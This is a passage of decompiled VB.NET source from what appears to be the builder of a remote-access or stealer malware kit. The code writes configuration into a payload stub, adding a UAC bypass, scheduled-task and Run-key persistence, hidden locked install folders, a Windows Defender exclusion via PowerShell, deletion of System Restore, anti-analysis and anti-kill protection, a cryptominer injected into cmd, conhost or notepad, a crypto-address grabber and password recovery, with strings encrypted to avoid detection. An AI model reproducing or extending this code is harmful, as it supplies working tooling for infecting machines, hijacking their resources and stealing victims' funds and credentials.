				Functions.RegistrySetValue("#Protect", Conversions.ToString(Conversions.ToBoolean(Me.ProtectInstallationFolder.Checked)))
				Functions.RegistrySetValue("#scheduled", Conversions.ToString(Conversions.ToBoolean(Me.TaskShc.Checked)))
				Functions.RegistrySetValue("#Delay", Conversions.ToString(Conversions.ToBoolean(Me.Delay.Checked)))
				Functions.RegistrySetValue("#NumDelay", Conversions.ToString(Me.NumDelay.Text))
				Functions.RegistrySetValue("#UACLOOP", Conversions.ToString(Conversions.ToBoolean(Me.UACLOOP.Checked)))
				Functions.RegistrySetValue("#Runwithhighestprivileges", Conversions.ToString(Conversions.ToBoolean(Me.Runwithhighestprivileges.Checked)))
				Functions.RegistrySetValue("#WD_Exclusions", Conversions.ToString(Conversions.ToBoolean(Me.WD_Exclusions.Checked)))
				Functions.RegistrySetValue("#DeleteSystemRestore", Conversions.ToString(Conversions.ToBoolean(Me.DeleteSystemRestore.Checked)))
				Functions.RegistrySetValue("#AntiAnalysis", Conversions.ToString(Conversions.ToBoolean(Me.AntiAnalysis.Checked)))
				Functions.RegistrySetValue("#ProcessCritical", Conversions.ToString(Conversions.ToBoolean(Me.ProcessCritical.Checked)))
				Functions.RegistrySetValue("#ProcessExplorer", Conversions.ToString(Conversions.ToBoolean(Me.ProcessProtections.Checked)))
				Functions.RegistrySetValue("#EnableMining", Conversions.ToString(Conversions.ToBoolean(Me.EnableMining.Checked)))
				Functions.RegistrySetValue("#InjectCmd", Conversions.ToString(Conversions.ToBoolean(Me.InjectCmd.Checked)))
				Functions.RegistrySetValue("#InjectConhost", Conversions.ToString(Conversions.ToBoolean(Me.InjectConhost.Checked)))
				Functions.RegistrySetValue("#InjectNotepad", Conversions.ToString(Conversions.ToBoolean(Me.InjectNotepad.Checked)))
				Functions.RegistrySetValue("#ConBTC", Conversions.ToString(Conversions.ToBoolean(Me.ConBTC.Checked)))
				Functions.RegistrySetValue("#ConETH", Conversions.ToString(Conversions.ToBoolean(Me.ConETH.Checked)))
				Functions.RegistrySetValue("#ConLSK", Conversions.ToString(Conversions.ToBoolean(Me.ConLSK.Checked)))
				Functions.RegistrySetValue("#ConDOGE", Conversions.ToString(Conversions.ToBoolean(Me.ConDOGE.Checked)))
				Functions.RegistrySetValue("#ConXMR", Conversions.ToString(Conversions.ToBoolean(Me.ConXMR.Checked)))
				Functions.RegistrySetValue("#MiningMAX", Conversions.ToString(Conversions.ToInteger(Me.MiningMAX.Value)))
				Functions.RegistrySetValue("#MiningWorkName", Conversions.ToString(Me.MiningWorkName.Text))
				Functions.RegistrySetValue("#MiningWalletAddress", Conversions.ToString(Me.MiningWalletAddress.Text))
				Functions.RegistrySetValue("#MiningPool", Conversions.ToString(Me.MiningPool.Text))
				Functions.RegistrySetValue("#EnableGrabber", Conversions.ToString(Conversions.ToBoolean(Me.EnableGrabber.Checked)))
				Functions.RegistrySetValue("#BTCAddress", Conversions.ToString(Me.BTCAddress.Text))
				Functions.RegistrySetValue("#ETHAddress", Conversions.ToString(Me.ETHAddress.Text))
				Functions.RegistrySetValue("#XMRAddress", Conversions.ToString(Me.XMRAddress.Text))
				Functions.RegistrySetValue("#PasswordsEnable", Conversions.ToString(Conversions.ToBoolean(Me.PasswordsEnable.Checked)))
				Functions.RegistrySetValue("#EnabledAssembly", Conversions.ToString(Conversions.ToBoolean(Me.EnabledAssembly.Checked)))
				Functions.RegistrySetValue("#TitleAssembly", Conversions.ToString(Me.TitleAssembly.Text))
				Functions.RegistrySetValue("#DescriptionsAssembly", Conversions.ToString(Me.DescriptionsAssembly.Text))
				Functions.RegistrySetValue("#CompanyAssembly", Conversions.ToString(Me.CompanyAssembly.Text))
				Functions.RegistrySetValue("#TrademarksAssembly", Conversions.ToString(Me.TrademarksAssembly.Text))
				Functions.RegistrySetValue("#CopyrightAssembly", Conversions.ToString(Me.CopyrightAssembly.Text))
				Functions.RegistrySetValue("#Versions1", Conversions.ToString(Conversions.ToInteger(Me.Versions1.Value)))
				Functions.RegistrySetValue("#Versions2", Conversions.ToString(Conversions.ToInteger(Me.Versions2.Value)))
				Functions.RegistrySetValue("#Versions3", Conversions.ToString(Conversions.ToInteger(Me.Versions3.Value)))
				Functions.RegistrySetValue("#Versions4", Conversions.ToString(Conversions.ToInteger(Me.Versions4.Value)))
				Functions.RegistrySetValue("#Enabled_Icon", Conversions.ToString(Conversions.ToBoolean(Me.Enabled_Icon.Checked)))
				Functions.RegistrySetValue("#Icon_Filename", Conversions.ToString(Me.Icon_Filename.Text))
				Functions.RegistrySetValue("#Spoofing", Conversions.ToString(Conversions.ToBoolean(Me.Spoofing.Checked)))
				Functions.RegistrySetValue("#SpoofingText", Conversions.ToString(Conversions.ToInteger(Me.SpoofingText.SelectedIndex)))
				Functions.RegistrySetValue("#ObfusctionComboBox", Conversions.ToString(Conversions.ToInteger(Me.ObfusctionComboBox.SelectedIndex)))
				Functions.RegistrySetValue("#EnabledSize", Conversions.ToString(Conversions.ToBoolean(Me.EnabledSize.Checked)))
				Functions.RegistrySetValue("#KB", Conversions.ToString(Conversions.ToBoolean(Me.KB.Checked)))
				Functions.RegistrySetValue("#MB", Conversions.ToString(Conversions.ToBoolean(Me.MB.Checked)))
				Functions.RegistrySetValue("#GB", Conversions.ToString(Conversions.ToBoolean(Me.GB.Checked)))
				Functions.RegistrySetValue("#SizeValue", Conversions.ToString(Conversions.ToInteger(Me.SizeValue.Value)))
				Functions.RegistrySetValue("#SaveBuilderInfo", Conversions.ToString(Conversions.ToBoolean(Me.SaveBuilderInfo.Checked)))
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000D64 RID: 3428 RVA: 0x0007537C File Offset: 0x0007357C
		Private Sub NameFolder_TextChanged(sender As Object, e As EventArgs)
			Me.InstallationPath()
		End Sub

		' Token: 0x06000D65 RID: 3429 RVA: 0x00075386 File Offset: 0x00073586
		Private Sub PayloadName_TextChanged(sender As Object, e As EventArgs)
			Me.InstallationPath()
		End Sub

		' Token: 0x06000D66 RID: 3430 RVA: 0x00075390 File Offset: 0x00073590
		Private Sub PayloadName_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x06000D67 RID: 3431 RVA: 0x000753D8 File Offset: 0x000735D8
		Private Sub NameFolder_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x06000D68 RID: 3432 RVA: 0x00075420 File Offset: 0x00073620
		Private Function InstallationPath() As Object
			Dim path As String = String.Empty
			Dim flag As Boolean = Operators.CompareString(Me.NameFolder.Text, Nothing, False) = 0
			If flag Then
				path = Me.NameFolder.PlaceholderText
			Else
				path = Me.NameFolder.Text
			End If
			Dim path2 As String = String.Empty
			Dim flag2 As Boolean = Operators.CompareString(Me.PayloadName.Text, Nothing, False) = 0
			If flag2 Then
				path2 = Me.PayloadName.PlaceholderText
			Else
				path2 = Me.PayloadName.Text
			End If
			Dim text As String = String.Empty
			Try
				Dim checked As Boolean = Me.Install_ProgramFiles.Checked
				If checked Then
					text = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), path), path2)
					Me.Installation_Location.IconRight = Resources.Admin
				Else
					Dim checked2 As Boolean = Me.Install_ProgramData.Checked
					If checked2 Then
						text = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), path), path2)
						Me.Installation_Location.IconRight = Resources.XXXX
					Else
						Dim checked3 As Boolean = Me.Install_AppData.Checked
						If checked3 Then
							text = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path), path2)
							Me.Installation_Location.IconRight = Resources.XXXX
						End If
					End If
				End If
				Me.Installation_Location.Text = text + ".exe"
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
			Return text
		End Function

		' Token: 0x06000D69 RID: 3433 RVA: 0x000755A8 File Offset: 0x000737A8
		Public Function InstallationFolderPath() As Object
			Dim result As String = String.Empty
			Try
				Dim checked As Boolean = Me.Install_ProgramFiles.Checked
				If checked Then
					result = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\" + Me.NameFolder.Text + "\"
				Else
					Dim checked2 As Boolean = Me.Install_ProgramData.Checked
					If checked2 Then
						result = "%AllUsersProfile%\" + Me.NameFolder.Text + "\"
					Else
						Dim checked3 As Boolean = Me.Install_AppData.Checked
						If checked3 Then
							result = "%AppData%\" + Me.NameFolder.Text + "\"
						End If
					End If
				End If
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
			Return result
		End Function

		' Token: 0x06000D6A RID: 3434 RVA: 0x00075680 File Offset: 0x00073880
		Private Sub Install_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.Install.Checked
				If checked Then
					Me.NameFolder.Enabled = True
					Me.PayloadName.Enabled = True
					Me.Installation_Location.Enabled = True
					Me.Install_AppData.Enabled = True
					Me.Install_ProgramFiles.Enabled = True
					Me.Install_ProgramData.Enabled = True
					Me.EnableStartup.Enabled = True
					Me.HiddenInstall.Enabled = True
					Me.ProtectInstallationFolder.Enabled = True
					Me.TaskShc.Enabled = True
					Dim checked2 As Boolean = Me.TaskShc.Checked
					If checked2 Then
						Me.Runwithhighestprivileges.Enabled = True
					End If
				Else
					Me.NameFolder.Enabled = False
					Me.PayloadName.Enabled = False
					Me.Installation_Location.Enabled = False
					Me.Install_AppData.Enabled = False
					Me.Install_ProgramFiles.Enabled = False
					Me.Install_ProgramData.Enabled = False
					Me.EnableStartup.Enabled = False
					Me.HiddenInstall.Enabled = False
					Me.ProtectInstallationFolder.Enabled = False
					Me.TaskShc.Enabled = False
					Me.Runwithhighestprivileges.Enabled = False
					Dim flag As Boolean = Not Me.TaskShc.Checked
					If flag Then
						Me.Runwithhighestprivileges.Enabled = False
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D6B RID: 3435 RVA: 0x00075828 File Offset: 0x00073A28
		Private Sub Install_ProgramFiles_CheckedChanged(sender As Object, e As EventArgs)
			Me.InstallationPath()
		End Sub

		' Token: 0x06000D6C RID: 3436 RVA: 0x00075832 File Offset: 0x00073A32
		Private Sub Install_ProgramData_CheckedChanged(sender As Object, e As EventArgs)
			Me.InstallationPath()
		End Sub

		' Token: 0x06000D6D RID: 3437 RVA: 0x0007583C File Offset: 0x00073A3C
		Private Sub Install_AppData_CheckedChanged(sender As Object, e As EventArgs)
			Me.InstallationPath()
		End Sub

		' Token: 0x06000D6E RID: 3438 RVA: 0x00075848 File Offset: 0x00073A48
		Public Function SetInstallation(Stub As String) As Object
			Dim text As String = Stub
			Try
				Dim checked As Boolean = Me.Delay.Checked
				If checked Then
					Dim value As Integer
					Try
						Dim flag As Boolean = Operators.CompareString(Me.Delay.Text, Nothing, False) = 0
						If flag Then
							value = 3
						Else
							value = Conversions.ToInteger(Me.Delay.Text)
						End If
					Catch ex As Exception
						value = 3
					End Try
					text = text.Replace("//Sleep", Resources.CodeSleep.ToString().Replace("""%Sleep%""", Conversions.ToString(value)))
				Else
					text = text.Replace("//Sleep", "Thread.Sleep(2000);")
				End If
				Dim checked2 As Boolean = Me.UAC.Checked
				If checked2 Then
					Dim checked3 As Boolean = Me.UACLOOP.Checked
					If checked3 Then
						text = text.Replace("//SkipUAC", Resources.UACLoop.Replace("%Random%", Functions.AES_EncryptText(Functions.GetRandomString(12).ToString(), Me.Key)).Replace("%Runcount%", Functions.AES_EncryptText("Runcount", Me.Key)).Replace("%x1%", Functions.AES_EncryptText("cmd", Me.Key)).Replace("%x2%", Functions.AES_EncryptText("runas", Me.Key)))
					Else
						text = text.Replace("//SkipUAC", Resources.ExploitUAC.Replace("%x1%", Functions.AES_EncryptText("cmd", Me.Key)).Replace("%x2%", Functions.AES_EncryptText("runas", Me.Key)))
					End If
					text = text.Replace("//UAC", "Osk.Admin();")
				Else
					text = text.Replace("//public static string RegistrySubkey = ""*key"";", "")
					text = text.Replace("//SkipUAC", "")
					text = text.Replace("//UAC", "")
				End If
				Dim checked4 As Boolean = Me.Install.Checked
				If checked4 Then
					text = text.Replace("//SetupInstallation", Resources.Setup)
					text = text.Replace("//Install2", Resources.CodeInstallation.Replace("%Folder%", Functions.AES_EncryptText(Conversions.ToString(Me.InstallationFolderPath()), Me.Key)).Replace("%Payload%", Functions.AES_EncryptText(Me.PayloadName.Text + ".exe", Me.Key)))
					text = text.Replace("//Install", "Setup.Install();")
					Dim checked5 As Boolean = Me.EnableStartup.Checked
					If checked5 Then
						text = text.Replace("//EnableStartup", Resources.EnableStartup.Replace("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Functions.AES_EncryptText("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Me.Key)))
						text = text.Replace("// Call EnableStartup(InstallPath.FullName)", "EnableStartup(InstallPath.FullName);")
					Else
						text = text.Replace("//EnableStartup", "")
						text = text.Replace("// Call EnableStartup(InstallPath.FullName)", "")
					End If
					Dim checked6 As Boolean = Me.HiddenInstall.Checked
					If checked6 Then
						text = text.Replace("//EnableHidden", Resources.CodeHidden.Replace("%Hide%", Functions.AES_EncryptText("+s +h ", Me.Key)))
						text = text.Replace("//HiddenFolder", "Hidden(InstallPath.Directory.FullName);")
						text = text.Replace("//HiddenPayload", "Hidden(InstallPath.FullName);")
					Else
						text = text.Replace("//EnableHidden", "")
						text = text.Replace("//HiddenFolder", "")
						text = text.Replace("//HiddenPayload", "")
					End If
					Dim checked7 As Boolean = Me.ProtectInstallationFolder.Checked
					If checked7 Then
						text = text.Replace("//FolderLock", Resources.FolderLock)
						text = text.Replace("//AddFolderSecurity(input, Environment.UserName, FileSystemRights.ReadData, AccessControlType.Deny);", "AddFolderSecurity(InstallPath.Directory.FullName, Environment.UserName, FileSystemRights.ReadData, AccessControlType.Deny);")
					Else
						text = text.Replace("//FolderLock", "")
						text = text.Replace("//AddFolderSecurity(input, Environment.UserName, FileSystemRights.ReadData, AccessControlType.Deny);", "")
					End If
					Dim checked8 As Boolean = Me.EnableStartup.Checked
					If checked8 Then
						text = text.Replace("//EnableStartup", Resources.EnableStartup.Replace("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Functions.AES_EncryptText("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Me.Key)))
						text = text.Replace("// Call EnableStartup(InstallPath.FullName)", "EnableStartup(InstallPath.FullName);")
					Else
						text = text.Replace("//EnableStartup", "")
						text = text.Replace("// Call EnableStartup(InstallPath.FullName)", "")
					End If
					Dim checked9 As Boolean = Me.HiddenInstall.Checked
					If checked9 Then
						text = text.Replace("//EnableHidden", Resources.CodeHidden.Replace("%Hide%", Functions.AES_EncryptText("+s +h ", Me.Key)))
						text = text.Replace("//HiddenFolder", "Hidden(InstallPath.Directory.FullName);")
						text = text.Replace("//HiddenPayload", "Hidden(InstallPath.FullName);")
					Else
						text = text.Replace("//EnableHidden", "")
						text = text.Replace("//HiddenFolder", "")
						text = text.Replace("//HiddenPayload", "")
					End If
					Dim checked10 As Boolean = Me.TaskShc.Checked
					If checked10 Then
						Dim checked11 As Boolean = Me.Runwithhighestprivileges.Checked
						If checked11 Then
							text = text.Replace("//Running", Resources.Running.Replace("%x0%", Functions.AES_EncryptText(".bat", Me.Key)).Replace("%x1%", Functions.AES_EncryptText("@echo off", Me.Key)).Replace("%x2%", Functions.AES_EncryptText("timeout 3 > NUL", Me.Key)).Replace("%x3%", Functions.AES_EncryptText("START ", Me.Key)).Replace("%x4%", Functions.AES_EncryptText("CD ", Me.Key)).Replace("%x5%", Functions.AES_EncryptText("DEL ", Me.Key)))
							text = text.Replace("//TASKS", Resources.TaskSchedulerAdmin.Replace("%*0%", Functions.AES_EncryptText("schTasks", Me.Key)).Replace("%*1%", Functions.AES_EncryptText(" /create /f /sc onlogon /rl highest /tn ", Me.Key)))
						Else
							text = text.Replace("//Running", Resources.RunningTask.Replace("%x0%", Functions.AES_EncryptText(".bat", Me.Key)).Replace("%x1%", Functions.AES_EncryptText("@echo off", Me.Key)).Replace("%x2%", Functions.AES_EncryptText("timeout 3 > NUL", Me.Key)).Replace("%x3%", Functions.AES_EncryptText("schtasks /query /TN", Me.Key)).Replace("%x4%", Functions.AES_EncryptText("SCHTASKS.EXE /RUN /TN", Me.Key)).Replace("%x5%", Functions.AES_EncryptText("if %errorlevel% NEQ 0 START ", Me.Key)))
							text = text.Replace("//TASKS", Resources.TaskSchedukerNormal.Replace("%*0%", Functions.AES_EncryptText("schTasks", Me.Key)).Replace("%*1%", Functions.AES_EncryptText(" /Create /SC DAILY /TN ", Me.Key)))
						End If
					Else
						text = text.Replace("//TASKS", "")
						text = text.Replace("//Running", Resources.Running.Replace("%x0%", Functions.AES_EncryptText(".bat", Me.Key)).Replace("%x1%", Functions.AES_EncryptText("@echo off", Me.Key)).Replace("%x2%", Functions.AES_EncryptText("timeout 3 > NUL", Me.Key)).Replace("%x3%", Functions.AES_EncryptText("START ", Me.Key)).Replace("%x4%", Functions.AES_EncryptText("CD ", Me.Key)).Replace("%x5%", Functions.AES_EncryptText("DEL ", Me.Key)))
					End If
				Else
					text = text.Replace("//Install2", "")
					text = text.Replace("//Installation", "")
					text = text.Replace("//SetupInstallation", "")
					text = text.Replace("//Install", "")
				End If
			Catch ex2 As Exception
				MessageBox.Show(Me, ex2.Message, "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				ListLogs.AddArray("Builder! Error : " + ex2.Message, 0)
			End Try
			Return text
		End Function

		' Token: 0x06000D6F RID: 3439 RVA: 0x000760C4 File Offset: 0x000742C4
		Public Function SetSecurity(Stub As String) As Object
			Dim text As String = Stub
			Try
				Dim flag As Boolean = Me.WD_Exclusions.Checked Or Me.DeleteSystemRestore.Checked Or Me.AntiAnalysis.Checked Or Me.ProcessCritical.Checked Or Me.ProcessProtections.Checked Or Me.EnableMining.Checked
				If flag Then
					text = text.Replace("//Security.Protection();", "Security.Protection();")
					text = text.Replace("//SecurityClass", Resources.Security)
					Try
						Dim checked As Boolean = Me.AntiAnalysis.Checked
						If checked Then
							text = text.Replace("//RunAntiAnalysis();", "Security.AntiAnalysis();")
							text = text.Replace("//SubAntiAnalysise", Resources.AntiAnalysis)
						Else
							text = text.Replace("//RunAntiAnalysis();", "")
							text = text.Replace("//SubAntiAnalysise", "")
						End If
					Catch ex As Exception
					End Try
					Try
						Dim checked2 As Boolean = Me.WD_Exclusions.Checked
						If checked2 Then
							text = text.Replace("//RunWD_Exception();", "WD_Exception();")
							text = text.Replace("//SubWD_Exception", Resources.WDExclusions.Replace("%X1%", Functions.AES_EncryptText("powershell", Me.Key)).Replace("%X2%", Functions.AES_EncryptText("Set-MpPreference -ExclusionExtension exe,bat,dll,ps1;exit", Me.Key)))
						Else
							text = text.Replace("//RunWD_Exception();", "")
							text = text.Replace("//SubWD_Exception", "")
						End If
					Catch ex2 As Exception
					End Try
					Try
						Dim checked3 As Boolean = Me.DeleteSystemRestore.Checked
						If checked3 Then
							text = text.Replace("//RunDeleteSystemRestore();", "DeleteSystemRestore();")
							text = text.Replace("//SubDeleteSystemRestore", Resources.DeleteSystemRestore)
						Else
							text = text.Replace("//RunDeleteSystemRestore();", "")
							text = text.Replace("//SubDeleteSystemRestore", "")
						End If
					Catch ex3 As Exception
					End Try
					Dim flag2 As Boolean = Me.ProcessCritical.Checked Or Me.ProcessProtections.Checked Or Me.EnableMining.Checked
					If flag2 Then
						text = text.Replace("//RunCheckValueProtect();", "Security.HelperPLG();")
						text = text.Replace("//SendSecurity.SecurityProtect();", "Security.GetProtectPLG();")
						Dim flag3 As Boolean = File.Exists("Plugins\Helper.dll")
						If flag3 Then
							text = text.Replace("//AntiKillProcess", Resources.AntiKillProcess.Replace("%HASHKEY%", GetHash.GetChecksum("Plugins\Helper.dll")).Replace("##GetPlugin##", Functions.AES_EncryptText("GetPlugin", Me.Key)).Replace("%Arges%", Functions.AES_EncryptText(Me.MiningAndProtectDLL(), Me.Key)).Replace("%%GetPlugin%%", Functions.AES_EncryptText("GetPlugin", Me.Key)))
						Else
							MessageBox.Show(Me, "Error : Helper.Dll library not found!!", "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Else
					text = text.Replace("//Security.Protection();", "")
					text = text.Replace("//SecurityClass", "")
				End If
			Catch ex4 As Exception
				MessageBox.Show(Me, ex4.Message, "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				ListLogs.AddArray("Builder! Error : " + ex4.Message, 0)
			End Try
			Return text
		End Function

		' Token: 0x06000D70 RID: 3440 RVA: 0x00076488 File Offset: 0x00074688
		Public Function SetMiner() As String
			Dim text As String = " -B -o "
			Try
				Dim flag As Boolean = Me.MiningPool.Text <> Nothing
				If flag Then
					text = text + Me.MiningPool.Text + " -a rx -k -u "
					Dim flag2 As Boolean = Me.MiningWalletAddress.Text <> Nothing
					If flag2 Then
						text = Conversions.ToString(Operators.AddObject(text, Operators.AddObject(Operators.AddObject(Operators.AddObject(Me.MiningCoin(), ":"), Me.MiningWalletAddress.Text), ".")))
						Dim flag3 As Boolean = Me.MiningWorkName.Text <> Nothing
						If flag3 Then
							text = text + Me.MiningWorkName.Text + " - p x--cpu - "
							text = Conversions.ToString(Operators.AddObject(text, Operators.AddObject("max - threads - hint = " + Me.MiningNumMax.Text.Split(New Char() { "%"c })(0) + "--donate - level = 1|'Split'|", Me.MiningInject(True))))
						Else
							MessageBox.Show("Please enter your Work Name", "Sorry!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
						End If
					Else
						MessageBox.Show("Please enter your Wallet Address", "Sorry!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					End If
				Else
					MessageBox.Show("Please enter your Pool:Port", "Sorry!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				End If
			Catch ex As Exception
				MessageBox.Show(Me, ex.Message, "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				ListLogs.AddArray("Builder! Error : " + ex.Message, 0)
			End Try
			Return text
		End Function

		' Token: 0x06000D71 RID: 3441 RVA: 0x00076638 File Offset: 0x00074838
		Public Function MiningInject(x As Boolean) As Object
			Dim text As String = Nothing
			Try
				Dim checked As Boolean = Me.InjectCmd.Checked
				If checked Then
					text = "cmd.exe"
				End If
				Dim checked2 As Boolean = Me.InjectConhost.Checked
				If checked2 Then
					text = "conhost.exe"
				End If
				Dim checked3 As Boolean = Me.InjectNotepad.Checked
				If checked3 Then
					text = "Notepad.exe"
				End If
			Catch ex As Exception
			End Try
			Dim result As Object
			If x Then
				result = "C:\Windows\System32\" + text
			Else
				result = text.Replace(".exe", "")
			End If
			Return result
		End Function

		' Token: 0x06000D72 RID: 3442 RVA: 0x000766E0 File Offset: 0x000748E0
		Public Function MiningCoin() As Object
			Dim result As String = Nothing
			Try
				Dim checked As Boolean = Me.ConBTC.Checked
				If checked Then
					result = "BTC"
				End If
				Dim checked2 As Boolean = Me.ConETH.Checked
				If checked2 Then
					result = "ETH"
				End If
				Dim checked3 As Boolean = Me.ConLSK.Checked
				If checked3 Then
					result = "LSK"
				End If
				Dim checked4 As Boolean = Me.ConDOGE.Checked
				If checked4 Then
					result = "DOGE"
				End If
				Dim checked5 As Boolean = Me.ConXMR.Checked
				If checked5 Then
					result = "XMR"
				End If
			Catch ex As Exception
			End Try
			Return result
		End Function

		' Token: 0x06000D73 RID: 3443 RVA: 0x00076794 File Offset: 0x00074994
		Private Sub Delay_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.Delay.Checked
				If checked Then
					Me.NumDelay.Enabled = True
				Else
					Me.NumDelay.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D74 RID: 3444 RVA: 0x000767F4 File Offset: 0x000749F4
		Private Sub Bport_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000D75 RID: 3445 RVA: 0x00076830 File Offset: 0x00074A30
		Private Sub NumDelay_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000D76 RID: 3446 RVA: 0x0007686C File Offset: 0x00074A6C
		Private Sub KeEncrypt_IconRightClick(sender As Object, e As EventArgs)
			Try
				Dim useSystemPasswordChar As Boolean = Me.KeEncrypt.UseSystemPasswordChar
				If useSystemPasswordChar Then
					Me.KeEncrypt.IconRight = Resources.KeyHide
					Me.KeEncrypt.UseSystemPasswordChar = False
				Else
					Me.KeEncrypt.IconRight = Resources.KeyShow
					Me.KeEncrypt.UseSystemPasswordChar = True
				End If
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
		End Sub

		' Token: 0x06000D77 RID: 3447 RVA: 0x000768FC File Offset: 0x00074AFC
		Private Sub RefreshConnect_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000D78 RID: 3448 RVA: 0x00076938 File Offset: 0x00074B38
		Private Sub DiscordNotif_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.DiscordNotif.Checked
				If checked Then
					Me.DiscordText.Enabled = True
				Else
					Me.DiscordText.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D79 RID: 3449 RVA: 0x00076998 File Offset: 0x00074B98
		Private Sub MutexText_IconRightClick(sender As Object, e As EventArgs)
			Me.MutexText.Text = "S500Mutex_" + Functions.GetRandomString(10)
		End Sub

		' Token: 0x06000D7A RID: 3450 RVA: 0x000769B8 File Offset: 0x00074BB8
		Private Sub TaskShc_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.TaskShc.Checked
				If checked Then
					Me.Runwithhighestprivileges.Enabled = True
				Else
					Me.Runwithhighestprivileges.Enabled = False
					Me.Runwithhighestprivileges.Checked = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D7B RID: 3451 RVA: 0x00076A24 File Offset: 0x00074C24
		Private Sub UAC_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.UAC.Checked
				If checked Then
					Me.UACLOOP.Enabled = True
				Else
					Me.UACLOOP.Enabled = False
					Me.UACLOOP.Checked = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D7C RID: 3452 RVA: 0x00076A90 File Offset: 0x00074C90
		Private Sub MiningMAX_Scroll(sender As Object, e As ScrollEventArgs)
			Try
				Dim flag As Boolean = Me.MiningMAX.Value < 11
				If flag Then
					Me.MiningNumMax.Text = Conversions.ToString(10) + "%"
				Else
					Me.MiningNumMax.Text = Conversions.ToString(Me.MiningMAX.Value) + "%"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D7D RID: 3453 RVA: 0x00076B1C File Offset: 0x00074D1C
		Private Sub EnableMining_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.EnableMining.Checked
				If checked Then
					Me.MiningWorkName.Enabled = True
					Me.MiningWalletAddress.Enabled = True
					Me.MiningPool.Enabled = True
					Me.PanelCPUmax.Enabled = True
				Else
					Me.MiningWorkName.Enabled = False
					Me.MiningWalletAddress.Enabled = False
					Me.MiningPool.Enabled = False
					Me.PanelCPUmax.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D7E RID: 3454 RVA: 0x00076BCC File Offset: 0x00074DCC
		Private Sub ConBTC_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D7F RID: 3455 RVA: 0x00076BCF File Offset: 0x00074DCF
		Private Sub ConXMR_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D80 RID: 3456 RVA: 0x00076BD2 File Offset: 0x00074DD2
		Private Sub ConETH_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D81 RID: 3457 RVA: 0x00076BD5 File Offset: 0x00074DD5
		Private Sub ConLSK_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D82 RID: 3458 RVA: 0x00076BD8 File Offset: 0x00074DD8
		Private Sub ConDOGE_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D83 RID: 3459 RVA: 0x00076BDC File Offset: 0x00074DDC
		Private Sub EnableGrabber_CheckedChanged(sender As Object, e As EventArgs)
			Try
				Dim checked As Boolean = Me.EnableGrabber.Checked
				If checked Then
					Me.BTCAddress.Enabled = True
					Me.ETHAddress.Enabled = True
					Me.XMRAddress.Enabled = True
				Else
					Me.BTCAddress.Enabled = False
					Me.ETHAddress.Enabled = False
					Me.XMRAddress.Enabled = False
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D84 RID: 3460 RVA: 0x00076C70 File Offset: 0x00074E70
		Private Sub RecoveryPassword_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPassword.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPassword.SelectedRows
